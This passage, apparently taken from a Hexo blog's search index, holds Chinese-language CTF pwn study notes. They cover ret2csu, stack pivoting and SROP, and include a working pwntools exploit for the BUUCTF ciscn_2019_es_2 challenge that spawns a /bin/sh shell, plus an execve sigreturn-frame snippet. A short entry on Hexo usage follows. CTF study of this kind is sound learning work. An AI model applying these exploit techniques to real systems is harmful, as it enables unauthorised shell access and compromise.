__frame_dummy_init_array_entry<br>.text:<span class="hljs-number">00000000004005</span>D2                 push    rbp<br>.text:<span class="hljs-number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:<span class="hljs-number">00000000004005</span>DA                 push    rbx<br>.text:<span class="hljs-number">00000000004005</span>DB                 mov     r14, rsi<br>.text:<span class="hljs-number">00000000004005</span>DE                 mov     r13, rdx<br>.text:<span class="hljs-number">00000000004005E1</span>                 sub     rbp, r12<br>.text:<span class="hljs-number">00000000004005E4</span>                 sub     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">00000000004005E8</span>                 sar     rbp, <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004005</span>EC                 call    _init_proc<br>.text:<span class="hljs-number">00000000004005F</span>1                 test    rbp, rbp<br>.text:<span class="hljs-number">00000000004005F</span>4                 jz      <span class="hljs-type">short</span> loc_400616<br>.text:<span class="hljs-number">00000000004005F</span>6                 xor     ebx, ebx<br>.text:<span class="hljs-number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="hljs-number">00000000</span>h]<br>.text:<span class="hljs-number">0000000000400600</span><br>.text:<span class="hljs-number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>j<br><span class="hljs-comment">//主要利用以下模块</span><br>.text:<span class="hljs-number">0000000000400600</span>                 mov     rdx, r13<br>.text:<span class="hljs-number">0000000000400603</span>                 mov     rsi, r14<br>.text:<span class="hljs-number">0000000000400606</span>                 mov     edi, r15d<br>.text:<span class="hljs-number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">000000000040060</span>D                 add     rbx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000400611</span>                 cmp     rbx, rbp<br>.text:<span class="hljs-number">0000000000400614</span>                 jnz     <span class="hljs-type">short</span> loc_400600<br>.text:<span class="hljs-number">0000000000400616</span><br>.text:<span class="hljs-number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">34</span>j<br>.text:<span class="hljs-number">0000000000400616</span>                 add     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040061</span>A                 pop     rbx<br>.text:<span class="hljs-number">000000000040061B</span>                 pop     rbp<br>.text:<span class="hljs-number">000000000040061</span>C                 pop     r12<br>.text:<span class="hljs-number">000000000040061</span>E                 pop     r13<br>.text:<span class="hljs-number">0000000000400620</span>                 pop     r14<br>.text:<span class="hljs-number">0000000000400622</span>                 pop     r15<br>.text:<span class="hljs-number">0000000000400624</span>                 retn<br>.text:<span class="hljs-number">0000000000400624</span> __libc_csu_init endp<br></code></pre></td></tr></table></figure><ul><li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 <strong>rbx,rbp,r12,r13,r14,r15</strong> 寄存器的数据。</li><li>从 0x0000000000400600 到 0x0000000000400609，我们可以将<strong>r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi</strong>（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 <strong>rbx+1 &#x3D; rbp</strong>，这样我们就<strong>不会执行</strong> loc_400600，进而可以继续执行下面的汇编程序，从而退出这个gadgets。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</li></ul><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p> <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用 - ZikH26 - 博客园</a> </p><ul><li>换个地方getshell</li></ul><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>溢出长度不够，<code>payload</code>长度收到限制无法执行getshell</p><ul><li>能够栈溢出，起码也要覆盖ebp</li><li>要有可写的地方<ul><li>bss段</li><li>栈中</li></ul></li></ul><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li><p>核心</p><p>两次的<code>leave,ret</code><br><code>leave：mov esp,ebp;pop ebp</code></p><p><code>ret：pop eip</code></p></li><li><p>main函数里的栈迁移</p><p>第一次leave ret;将<strong>ebp给放入我们指定的位置</strong>（这个位置的就是迁移后的所在位置）</p><p>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是<strong>system函数的plt地址</strong>）</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E7%AC%AC%E4%B8%80%E6%AC%A1.png" alt="第一次"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E7%AC%AC%E4%BA%8C%E6%AC%A1.png" alt="第二次"></p></li></ul><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><p>buu的ciscn_2019_es_2</p><p> <a href="https://buuoj.cn/challenges#ciscn_2019_es_2">BUUCTF在线评测</a> </p><ul><li><p>checksec</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718391990.png" alt="1737718391990"></p></li><li><p>IDA</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718423112.png" alt="1737718423112"><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718435019.png" alt="1737718435019"></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737718474976.png" alt="1737718474976"></p></li><li><p>思路</p><p>就是利用栈迁移，将ebp覆盖成s顶部地址，将返回地址覆盖成leave,ret的地址即可</p><p>现在主要是要得到s顶部的地址，ida里可以<strong>利用第一个read将<code>\0</code>覆盖掉</strong>从而泄露ebp上的内容，计算偏移后得到s地址</p></li><li><p>计算偏移</p><p>将断点下载nop处，gdb调试</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737719058637.png" alt="1737719058637"></p><p>得到偏移0x38</p></li><li><p>构造栈上数据</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/1737719250596.png" alt="1737719250596"></p></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># r=remote(&quot;node5.buuoj.cn&quot;,25608)</span><br>r=process(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./es2&#x27;</span>)<br>main_addr=elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>leave_ret_addr=<span class="hljs-number">0x08048562</span><br>system_addr=<span class="hljs-number">0x08048400</span><br><span class="hljs-comment"># gdb.attach(r)</span><br><br>r.recvuntil(<span class="hljs-string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x25</span>+<span class="hljs-string">b&#x27;ANV&#x27;</span><br>r.send(payload1)  <span class="hljs-comment"># 注意这里要是send而不是sendline，否则在底下接收数据的时候会出错，因为多了一个回车那么就不再是recv到ANV了</span><br>r.recvuntil(<span class="hljs-string">&quot;ANV&quot;</span>)<br>ebp=u32(r.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ebp))<br>s_addr=ebp-<span class="hljs-number">0x38</span><br>binsh_addr=s_addr+<span class="hljs-number">0x10</span> <span class="hljs-comment"># 栈上距离s填充四格，所以要加16，也就是0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(binsh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(s_addr))<br><br>payload2=<span class="hljs-string">b&#x27;AAAA&#x27;</span>+p32(system_addr)+p32(main_addr)+p32(binsh_addr)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(s_addr)+p32(leave_ret_addr)<br>r.send(payload2)<br><span class="hljs-comment"># pause()</span><br>r.interactive()<br></code></pre></td></tr></table></figure></li></ul><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><ul><li><p>signal机制</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/signal.png" alt="signal"></p><ul><li>内核向进程发送signal机制，进程被挂起，进入内核态</li><li>内核态保存上下文：将所有寄存器压入栈中，压入signal信息。指向sigreturn的系统掉哦那个地址，也就是图中所示的1过程</li><li>在signal handler后执行sigreturn，恢复寄存器，我们所做的就是<strong>构造好栈，然后触发sigreturn，达到控制寄存器的目的，从而getshell</strong></li><li>32位sigreturn调用号为118</li><li>64位sigreturn调用号为15</li></ul></li><li><p>前提条件</p><ul><li>必须存在栈溢出</li><li>必须知道&#x2F;bin&#x2F;sh的地址</li><li>允许溢出的长度必须足够长</li><li>可以去系统调用sigreturn</li><li>知道syscall的地址</li></ul></li><li><p>如何利用</p><ul><li><p>我们通过伪造SignFrame，然后除法Sigreturn，将栈中构造好的数据送入寄存器，通过syscall执行系统调用</p></li><li><p>pwntools集成了SROP的攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 例子</span><br>sigframe = SigreturnFrame()<br>sigframe.rax = constants.SYS_execve<br>sigframe.rdi = stack_addr + <span class="hljs-number">0x120</span>  <span class="hljs-comment"># &quot;/bin/sh&quot; &#x27;s addr</span><br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br></code></pre></td></tr></table></figure><p>我们可以直接设置寄存器的值</p></li><li><p>首先设置rax，将返回地址覆盖成syscall，触发sigreturn即可</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>备注</title>
    <link href="/2025/01/18/%E5%A4%87%E6%B3%A8/"/>
    <url>/2025/01/18/%E5%A4%87%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><h2 id="创建新文章"><a href="#创建新文章" class="headerlink" title="创建新文章"></a>创建新文章</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">hexo <span class="hljs-built_in">new</span> <span class="hljs-built_in">post</span> 文件名<br></code></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p>步骤</p><ol><li>将图片放入对于文件夹下</li><li>md中输入<code>![图片下的备注](图片名)</code></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
